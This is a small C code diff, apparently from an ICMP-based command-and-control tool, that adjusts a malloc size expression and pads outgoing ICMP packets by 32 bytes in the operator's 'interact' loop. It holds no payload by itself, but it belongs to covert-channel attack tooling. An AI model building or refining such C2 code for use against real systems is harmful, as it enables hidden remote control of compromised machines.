@@ -72,7 +72,7 @@ void interact(int sockfd) {
     input = malloc(BUFFER_SIZE);
     CHECK_ALLOC(input);
 
-    packet = (unsigned char *) malloc(packet_size);
+    packet = (unsigned char *) malloc(sizeof(unsigned char) * packet_size);
     CHECK_ALLOC(packet);
 
     puts("[+] Waiting for connections...");
@@ -94,9 +94,9 @@ void interact(int sockfd) {
 
             addr = prep_ip_headers(ip);
 
-            c2_prep_icmp_headers(icmp, 0);
+            c2_prep_icmp_headers(icmp, sizeof(struct icmphdr) + 32);
 
-            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &addr, sizeof(addr));
+            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + 32, 0, (struct sockaddr *) &addr, sizeof(addr));
             if (nbytes < 0) {
                 perror("sendto()");
                 goto out;
